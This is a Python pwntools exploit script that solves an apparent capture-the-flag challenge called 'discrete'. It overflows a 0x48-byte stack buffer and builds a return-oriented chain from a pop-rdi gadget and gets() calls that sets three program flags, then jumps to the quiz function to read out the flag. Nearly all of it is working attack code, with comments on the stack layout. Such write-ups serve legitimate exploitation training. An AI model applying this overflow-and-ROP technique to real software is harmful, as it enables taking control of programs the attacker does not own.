from pwn import *
import struct

#p = remote('bin.bcactf.com', 49155)
p = process('./discrete')

e = ELF('./discrete')

# read to the prompt
p.readuntil('> ')

'''
The stack is straight forward on this one
response        {Frame offset -0x48}
saved_rbp       {Frame offset -0x08}
return_address  {Frame offset  0x00}
'''

'''
No leak for this one but it loads at a static address

You have to overwrite the return address of main() and do a chain to set
knows_logic, knows_algebra, and knows_functions to 1
'''

print('[INFO] quiz address 0x%x' %(e.symbols['quiz']))

## 0x00000000004017a3 : pop rdi ; ret
poprdi = p64(0x4017a3)

response = b'i will get an A\x00'
response += b'a'*(0x48 - len(response))

## call gets with know_logic

## first get control of rdi
response += poprdi
response += struct.pack('Q', e.symbols['knows_logic'])
response += struct.pack('Q', e.symbols['gets'])
response += poprdi
response += struct.pack('Q', e.symbols['knows_algebra'])
response += struct.pack('Q', e.symbols['gets'])
response += poprdi
response += struct.pack('Q', e.symbols['knows_functions'])
response += struct.pack('Q', e.symbols['gets'])
response += struct.pack('Q', e.symbols['quiz'])
response += struct.pack('Q', e.symbols['exit'])
response += b'\n'

p.send(response)

p.readline()
p.readline()
p.readline()

p.send('aa\n')
p.send('aa\n')
p.send('aa\n')

p.readline()
p.readline()
flag = p.readline()

print('Flag: ', flag)

p.close()

